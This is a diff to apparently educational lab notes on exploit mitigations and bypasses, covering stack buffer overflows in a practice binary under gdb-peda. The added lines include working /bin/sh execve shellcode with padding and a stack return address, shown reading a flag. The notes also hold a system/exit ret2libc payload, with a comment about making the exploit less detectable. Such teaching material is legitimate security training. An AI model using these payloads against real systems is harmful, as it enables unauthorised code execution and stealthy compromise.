@@ -127,8 +127,13 @@ Exploit Mitigations and Bypasses
 		Find the location of esp
 			gdb-peda$ info registers esp
 			(shortcut: i r esp)
+			0xffffc990
 			
-			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'
+		Look on the stack to see where the A's start, and write the exploit within that constraint
+			
+			python2 -c 'print r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*(152 - 23) + r"\xe4\xca\xff\xff"'
+			
+			cat flag # It worked!
 		
 			
 	Exercise 2: Bypass ASLR, no NX with Trampoline
@@ -138,7 +143,8 @@ Exploit Mitigations and Bypasses
 		Find useful ESP gadgets
 			gdb-peda$ jmpcall -r esp
 			gdb-peda$ jmpcall
-			
+		
+		Now we get to turn on and bypass a mitigation! Turn on ASLR.
 		
 		/bin/sh Shellcode from exploit-db in escaped format
 			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
@@ -192,7 +198,7 @@ Exploit Mitigations and Bypasses
 		Print escaped NX bypass exploit code (file: exploit_e3_plt.py)
 			Python file:
 				addr_system_esc = r"\xe0\x03\xe5\xb7"
-				addr_exit_esc = r"\xb0\x31\xe4\xb7"
+				addr_exit_esc = r"\xb0\x31\xe4\xb7" # If we do this right, our exploit doesn't even crash the target, and is less detectable!
 				args = r"\x20\x8a\x04\x08"
 				
 				print "A"*152 + addr_system_esc + addr_exit_esc + args
